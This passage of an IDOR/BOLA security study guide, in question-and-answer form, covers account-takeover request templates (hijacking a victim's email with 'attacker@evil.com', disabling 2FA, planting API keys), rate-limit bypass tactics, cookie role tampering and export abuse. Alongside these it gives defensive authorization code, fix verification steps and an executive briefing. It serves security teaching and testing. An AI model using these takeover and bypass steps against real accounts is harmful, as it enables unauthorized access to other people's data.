{"email": "attacker@evil.com"}
```

Then password reset to attacker email = takeover.

**Method 2: Password change directly**
```
POST /api/users/{victim_id}/change-password
{"new_password": "MyPassword123"}
```

Some IDOR-affected endpoints don't require current password.

**Method 3: 2FA manipulation**
```
DELETE /api/users/{victim_id}/2fa
```

Or:
```
POST /api/users/{victim_id}/2fa/setup
{"phone": "attacker_phone"}
```

Disable victim's 2FA or set up your own.

**Method 4: Recovery questions**
```
PATCH /api/users/{victim_id}/security-questions
{
  "question": "...",
  "answer": "attacker_known_answer"
}
```

Set recovery questions you know answers to.

**Method 5: API keys**
```
POST /api/users/{victim_id}/api-keys
{"name": "test", "permissions": ["read", "write"]}
```

Generate API key for victim's account = persistent access.

**Method 6: Connected accounts**
```
POST /api/users/{victim_id}/social-accounts
{"provider": "google", "id": "your_google_id"}
```

Link your Google account → login via Google as victim.

**Method 7: Session/token manipulation**
```
GET /api/users/{victim_id}/sessions
DELETE /api/sessions/{session_id}
```

Kill victim's sessions (DoS) or steal session tokens (takeover).

### Q87: How to detect rate-limited IDOR exploitation?
**A:**

**Rate limit indicators:**

**1. Status code 429:**
```
HTTP/1.1 429 Too Many Requests
```

**2. Headers:**
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1640000000
Retry-After: 60
```

**3. Body messages:**
```json
{"error": "Rate limit exceeded"}
```

**4. Soft limits (slow responses):**
- Normal: 50ms
- Throttled: 5000ms
- Server slowing requests intentionally

**5. Account lockout:**
- After X attempts, account locked
- Different from rate limit

**Bypass strategies:**

**1. Multiple accounts:**
- Create test accounts before testing
- Rotate between them

**2. IP rotation:**
- VPN, Tor, proxies
- Rate limits often per-IP

**3. Distributed testing:**
- Multiple machines
- AWS Lambda for parallel requests

**4. Authentication rotation:**
- Different sessions
- Different API keys

**5. Slow and steady:**
- Below rate limit threshold
- Patience for enumeration

**Ethical bug bounty:**
- Stop if rate limited
- Don't try to bypass aggressively
- Report what you found
- Note "could be more impactful without rate limiting"

### Q88: IDOR in SaaS analytics/dashboards
**A:**

**Analytics dashboard IDOR:**

**1. Tenant data isolation:**
```
GET /api/analytics/{tenant_id}/dashboards
GET /api/dashboards/{dashboard_id}/widgets
```

Cross-tenant data leak.

**2. Custom reports:**
```
GET /api/reports/{report_id}/data
POST /api/reports/{report_id}/export
```

Export others' business intelligence.

**3. Saved queries:**
```
GET /api/queries/{query_id}/results
```

Run others' saved analytics queries.

**4. Real-time metrics:**
```
GET /api/metrics/{org_id}/realtime
```

Live view into competitors' operations.

**Business impact:**
- Competitive intelligence theft
- Trade secret violations
- Pricing strategy exposure
- Customer base information leaked

### Q89: IDOR in collaboration features (Notion, Airtable-like)
**A:**

**Collaborative app IDOR vectors:**

**1. Workspace access:**
```
GET /api/workspaces/{workspace_id}
```

**2. Page/document access:**
```
GET /api/pages/{page_id}
GET /api/pages/{page_id}/blocks
GET /api/pages/{page_id}/comments
```

**3. Shared databases:**
```
GET /api/databases/{db_id}/rows
GET /api/databases/{db_id}/views
PATCH /api/databases/{db_id}/rows/{row_id}
```

**4. Permission management:**
```
POST /api/pages/{page_id}/permissions
{"user_id": "your_id", "level": "edit"}
```

Grant yourself edit access to others' pages.

**5. Comments and mentions:**
```
POST /api/comments
{"page_id": "victim_page", "content": "..."}
```

Comment on others' private pages.

**6. Version history:**
```
GET /api/pages/{page_id}/versions
GET /api/pages/{page_id}/versions/{version_id}
```

Access historical data, even if current page restricted.

**7. Export functions:**
```
POST /api/exports
{"page_id": "victim_page", "format": "pdf"}
```

Export others' content.

### Q90: How to test IDOR via deep links?
**A:**

**Deep linking IDOR:**

**1. Email/notification links:**
```
https://app.com/notifications/{notification_id}/open
https://app.com/orders/{order_id}/view
```

Often link contains ID, attacker can guess/enumerate.

**2. Magic links (passwordless login):**
```
https://app.com/login?token={magic_token}
```

If tokens predictable → account takeover.

**3. Sharing links:**
```
https://app.com/shared/{share_id}
https://app.com/view/{view_token}
```

Shared docs/files - test enumeration.

**4. Invitation acceptance:**
```
https://app.com/invite/{invite_id}/accept
```

Accept invites meant for others.

**5. Mobile deep links:**
```
myapp://order/{order_id}
myapp://user/{user_id}/profile
```

Same IDOR issues as web.

**6. SMS/push notification links:**
- 2FA codes in URLs
- Action confirmations
- Recovery links

### Q91: Defense techniques against IDOR
**A:**

**Comprehensive IDOR defense:**

**1. Authorization on every access:**
```python
def get_resource(resource_id, current_user):
    resource = Resource.objects.get(id=resource_id)
    
    # Authorization check
    if not user_can_access(current_user, resource):
        raise PermissionDenied()
    
    return resource

def user_can_access(user, resource):
    return (
        resource.owner == user or
        user in resource.shared_with or
        user.is_admin
    )
```

**2. Filter at query level:**
```python
# Don't fetch then check
def get_orders(user):
    return Order.objects.filter(owner=user)

# Object simply doesn't exist for unauthorized user
```

**3. Use frameworks' built-in authorization:**

**Django REST Framework:**
```python
class OrderViewSet(viewsets.ModelViewSet):
    queryset = Order.objects.all()
    permission_classes = [IsAuthenticated, IsOwner]
    
    def get_queryset(self):
        return self.queryset.filter(owner=self.request.user)

class IsOwner(permissions.BasePermission):
    def has_object_permission(self, request, view, obj):
        return obj.owner == request.user
```

**4. Use indirect references:**
```
Real ID: 100
Reference: ref_abc123 (mapped per-session)

User sees: /api/orders/ref_abc123
Server resolves to: order_id 100, only if user owns it
```

**5. Centralized authorization:**
- Authorization middleware
- Policy-based access (Pundit, CASL)
- Single source of truth

**6. Logging and monitoring:**
```python
def access_resource(user, resource_id):
    try:
        resource = get_authorized(user, resource_id)
        log_access(user, resource_id, granted=True)
        return resource
    except PermissionDenied:
        log_access(user, resource_id, granted=False)
        alert_security(user, resource_id)  # Repeated denials = attack
        raise
```

**7. Rate limit per user:**
- Detect enumeration
- Block aggressive access patterns

**8. Audit and pentest:**
- Regular reviews
- Bug bounty programs
- Automated security tests

**9. Defense in depth:**
- WAF rules
- Network-level controls
- Application controls
- Database constraints

**10. Education:**
- Developer security training
- Code review focus
- Known vulnerable patterns documented

### Q92: How to verify IDOR fix is complete?
**A:**

**IDOR fix verification:**

**1. Test the original PoC:**
- Exact same payload
- Should now return 403/404
- Confirm proper response code

**2. Test variations:**
- Different HTTP methods
- Different content types
- URL encoding
- Edge cases

**3. Test bypass attempts:**
- Header manipulation
- Parameter pollution
- Different auth contexts

**4. Test related endpoints:**
- If `/users/{id}` fixed, check `/users/{id}/orders`
- Pattern: Same root cause likely in similar endpoints

**5. Code review:**
- See actual fix
- Verify proper authorization library used
- Check applied at correct layer

**6. Test edge cases:**
- Admin user (should still access)
- Owner of resource (should access)
- User with shared access
- Different roles

**7. Performance check:**
- Authorization checks shouldn't slow down significantly
- Heavy authorization = potential bypass via timeout/race condition

**8. Regression tests:**
- Automated tests for this scenario
- Prevent regression in future

**9. Cross-tenant verification (multi-tenant):**
- Test cross-tenant explicitly
- Confirm proper tenant isolation

**10. Document:**
- What was tested
- Results
- Sign-off

### Q93: IDOR in healthcare patient portal - specific testing
**A:**

**Patient portal IDOR (high-stakes):**

**Test endpoints:**

```
GET /api/patients/{patient_id}/profile
GET /api/patients/{patient_id}/medical-history
GET /api/patients/{patient_id}/prescriptions
GET /api/patients/{patient_id}/lab-results
GET /api/patients/{patient_id}/appointments
GET /api/patients/{patient_id}/insurance
GET /api/patients/{patient_id}/messages
GET /api/patients/{patient_id}/documents
GET /api/patients/{patient_id}/family-members
GET /api/patients/{patient_id}/care-team
```

**Test all reads, writes, and deletions:**

**Read examples:**
- View other patients' medical records
- See others' prescriptions
- Read confidential doctor's notes

**Write examples:**
- Modify others' appointment requests
- Cancel others' appointments
- Update others' insurance info

**Specific to healthcare:**

**1. Family access:**
- Parents can access children's records (legitimate)
- Test if you can claim relationship without authorization
```
POST /api/patients/{patient_id}/family-access
{"relationship": "parent"}
```

**2. Provider access:**
- Doctors access patients
- Test if you can access patients not assigned to you

**3. Insurance company access:**
- Insurance representatives can view limited info
- Test if you can access more than allowed

**4. Emergency access:**
- Break-glass procedures for emergencies
- Often have IDOR
- Always logged but emergency might be falsifiable

**Compliance impact:**
- HIPAA violation
- Mandatory breach notification
- Federal penalties
- State penalties (varies)
- Patient lawsuits
- Reputation damage

### Q94: IDOR via cookie manipulation
**A:**

**Cookie-based IDOR:**

**1. User ID in cookie:**
```
Cookie: user_id=100; session=abc123
```

Change cookie value:
```
Cookie: user_id=999; session=abc123
```

Apps that trust cookies are vulnerable.

**2. Role in cookie:**
```
Cookie: role=user; session=abc123
```

Change to:
```
Cookie: role=admin; session=abc123
```

**3. Tenant ID in cookie:**
```
Cookie: tenant=acme; session=...
Cookie: tenant=globex; session=...  ← Switch tenants
```

**4. JWT in cookie:**
```
Cookie: jwt=eyJ...
```

Modify JWT (if vulnerable to algorithm confusion, weak signature):
- Change user_id in payload
- Sign with weak/no key
- Use modified JWT

**5. Cookie scoping:**
```
Cookie: SESSION=xxx; Domain=.example.com
```

If overly broad, subdomain takeover could leak.

**Testing approach:**
- Identify all cookies
- Note which ones contain identifying data
- Test each one for modification
- Check if app blindly trusts cookies

### Q95: How does API versioning create IDOR opportunities?
**A:**

**Legacy version vulnerabilities:**

**Real-world pattern:**
1. v1 API: Built quickly, security loose
2. v2 API: Audited, IDOR fixed
3. v3 API: Newer, may have new IDOR

**Problem:** v1 still active for backward compatibility.

**Testing:**
- For every modern endpoint, test v1 equivalent
- v1 likely missing recent security fixes

**Example:**
```
v2 (fixed): GET /api/v2/users/{id}/profile
  → Checks authorization, returns 403 for other users

v1 (vulnerable): GET /api/v1/users/{id}/profile
  → No authorization check, returns data
```

**Beta/preview APIs:**
- `/api/beta/`, `/api/preview/`, `/api/next/`
- Often less reviewed
- Higher chance of IDOR

**Mobile-specific APIs:**
- `/api/mobile/v1/`
- May have different (weaker) authorization

**Partner/integration APIs:**
- `/api/partner/`
- Trust relationships with partners
- Sometimes accessible without partner credentials

**Always test:**
- Multiple API versions
- All endpoint paths
- Different content types
- Different headers

### Q96: How to test IDOR in CSV/Excel export endpoints?
**A:**

**Export endpoints often have IDOR:**

**1. Direct export:**
```
GET /api/users/{user_id}/export?format=csv
GET /api/users/{user_id}/export?format=xlsx
```

**2. Report exports:**
```
POST /api/reports/export
Body: {"report_id": "any_id", "format": "pdf"}
```

**3. Bulk exports:**
```
POST /api/exports/bulk
Body: {"user_ids": [1, 2, 3, ..., 9999]}
```

Test if includes data for users you don't own.

**4. Scheduled exports:**
```
POST /api/scheduled-exports
Body: {
  "schedule": "daily",
  "report_type": "all_users",
  "email": "your@email"
}
```

Receive sensitive data via email daily.

**5. Export status/download:**
```
GET /api/exports/{export_id}/status
GET /api/exports/{export_id}/download
```

Download others' completed exports.

**6. Export history:**
```
GET /api/exports/history
```

May leak past exports' metadata.

### Q97: Best resources for learning IDOR (your study list)
**A:**

**Comprehensive IDOR learning resources:**

**1. PortSwigger Web Security Academy:**
- Access Control Lab series
- Free, hands-on practice
- https://portswigger.net/web-security/access-control

**2. HackTricks:**
- IDOR section comprehensive
- Real-world examples
- https://book.hacktricks.xyz

**3. PayloadsAllTheThings:**
- IDOR section
- Payloads and techniques
- GitHub repo

**4. OWASP:**
- OWASP Top 10 A01
- OWASP API Top 10 BOLA section
- Cheat sheets

**5. Bug Bounty platforms:**
- HackerOne disclosed reports
- Bugcrowd disclosed reports
- Filter by IDOR/BOLA
- Learn from real findings

**6. CTF challenges:**
- PicoCTF
- Hack The Box
- Some include IDOR challenges

**7. Books:**
- "Real-World Bug Hunting" by Peter Yaworski
- "The Web Application Hacker's Handbook"
- "Bug Bounty Bootcamp"

**8. YouTube channels:**
- LiveOverflow
- John Hammond
- Stök
- Nahamsec
- BittenTech (your reference)

**9. Practice platforms:**
- DVWA (Damn Vulnerable Web App)
- WebGoat
- Mutillidae
- Juice Shop

**10. Blogs:**
- HackerOne hacktivity
- Bugcrowd University
- Security researchers' personal blogs

**Real-world targets (with permission):**
- Bug bounty programs
- Capture The Flag events
- Personal lab environments

### Q98: How do you stay current with IDOR techniques?
**A:**

**Staying current strategies:**

**1. Follow security researchers on Twitter/X:**
- @nahamsec
- @stokfredrik
- @PortSwigger
- @kishanbagaria
- @InsiderPhD
- Researchers in your domain

**2. Subscribe to security newsletters:**
- TLDR Security
- Hacker News Newsletter
- Cyber Defense Magazine

**3. Read bug bounty reports:**
- HackerOne disclosed (filter: severity:high, vuln:idor)
- Bugcrowd disclosed
- BugBounty.tv

**4. Conference talks:**
- DEF CON
- Black Hat
- OWASP AppSec
- BSides
- Watch on YouTube

**5. Practice regularly:**
- Hack The Box monthly
- TryHackMe challenges
- Vulnerable apps

**6. Build/break:**
- Make vulnerable apps
- Then fix them
- Understand both perspectives

**7. Code review:**
- Read open source apps
- Find vulnerabilities in real code
- PR fixes

**8. Engage in CTFs:**
- Annual CTFs
- Weekly challenges
- Team competitions

**9. Mentor or be mentored:**
- Discord communities
- Reddit r/netsec
- Bug bounty Discord servers

**10. Contribute to tools:**
- Burp Suite extensions
- Open source security tools
- Stay engaged with community

### Q99: What's the future of IDOR vulnerabilities?
**A:**

**Future trends:**

**1. More IDOR via APIs:**
- API-first development continues
- More API endpoints = more IDOR opportunities
- BOLA stays #1 in OWASP API Top 10

**2. GraphQL IDOR rising:**
- More apps adopting GraphQL
- Field-level authorization complex
- Nested IDOR cascades

**3. Microservices challenges:**
- Service-to-service authorization
- Internal API exposure
- Trust boundary issues

**4. Cloud-native IDOR:**
- S3 bucket misconfigurations
- Container API access
- Cloud function permissions

**5. ML/AI integration IDOR:**
- AI assistants with user context
- Prompt injection causing IDOR
- Data leakage via AI features

**6. WebAuthn impact:**
- Better authentication doesn't fix authorization
- IDOR persists despite passwordless

**7. Zero Trust adoption:**
- "Never trust, always verify"
- Should reduce IDOR
- Implementation complexity may introduce new bugs

**8. Privacy regulations:**
- GDPR, CCPA, more coming
- Higher penalties for IDOR
- Forces better authorization

**9. Bug bounty payouts:**
- IDOR rewards stay strong
- Critical IDOR commands premium
- Specialized programs (healthcare, finance)

**10. Automated discovery:**
- AI-assisted IDOR finding
- Better tools for testers
- Better tools for attackers too

**Career implications:**
- IDOR knowledge always valuable
- Understanding business logic critical
- Combining IDOR with other vulnerabilities
- API security specialization growing
- Cloud security expertise highly valued

### Q100: How would you explain IDOR severity to leadership during a debrief?
**A:**

**Executive-level IDOR explanation:**

"During our recent security assessment, we discovered a critical vulnerability we need to discuss.

**The Issue (30 seconds):**
We found that any customer with an account on your platform can view, modify, or delete any other customer's data simply by changing a number in the URL. No special hacking skills required - this is essentially an open door.

**The Scale:**
- All 50,000 of your customers are affected
- Sensitive data exposed includes:
  - Personal information (email, phone, addresses)
  - Payment methods on file
  - Order history
  - Account settings
- A single automated script could extract all customer data in hours

**Why This Matters to Business:**

*Customer Trust:*
- One breach = immediate trust loss
- Customers may leave for competitors
- Social media amplifies negative incidents

*Financial Impact:*
- Regulatory fines: Up to 4% of global revenue under GDPR
- Class-action lawsuits: $50-$500 per affected user
- Forensic costs: $1-5 million typical breach
- Notification costs: $100-200K
- Total potential exposure: $25-100M+ for breach of this scale

*Regulatory:*
- GDPR (EU): Massive fines, mandatory disclosure
- CCPA (California): Per-violation penalties
- Industry-specific (PCI for payments, HIPAA for healthcare)
- Mandatory breach notification within 72 hours

*Operational:*
- Engineering time to fix and respond
- Public relations management
- Legal counsel
- Possible regulatory investigation

**The Good News:**

1. The vulnerability has not been exploited (no evidence in logs)
2. The fix is straightforward (engineering estimate: 1-2 weeks)
3. We caught it before attackers did
4. Discovery before regulatory deadlines

**Our Recommended Action Plan:**

*Immediate (next 48 hours):*
- Engineering team patches the most critical endpoints
- Deploy hotfix to prevent further exposure
- Add monitoring for suspicious access patterns

*Short-term (1-2 weeks):*
- Comprehensive fix across all affected endpoints
- Code review of similar patterns
- Add automated security tests

*Medium-term (1-3 months):*
- Security training for all engineering staff
- Bug bounty program consideration
- External security audit
- Implementation of access control framework

*Long-term (ongoing):*
- Security testing in CI/CD pipeline
- Regular penetration testing
- Security review for new features

**Investment Required:**
- Engineering: ~200 hours
- Tools/services: $20-50K
- External audit: $30-100K
- Total: $50-150K

**Vs. Cost of Breach:**
- Estimated breach cost: $25-100M+

**ROI: 100x to 1000x return on investment**

**Bottom Line:**
This is a critical issue requiring immediate attention. The investment to fix is minimal compared to the risk of exploitation. We need executive support for:
1. Resource allocation
2. Priority over feature work
3. Possible customer communication if exploitation found in logs

Questions? I'm happy to dive into technical details or discuss the action plan further."

---

## END OF PART 2 - IDOR/BOLA SECTION (100 Q&A COMPLETE)
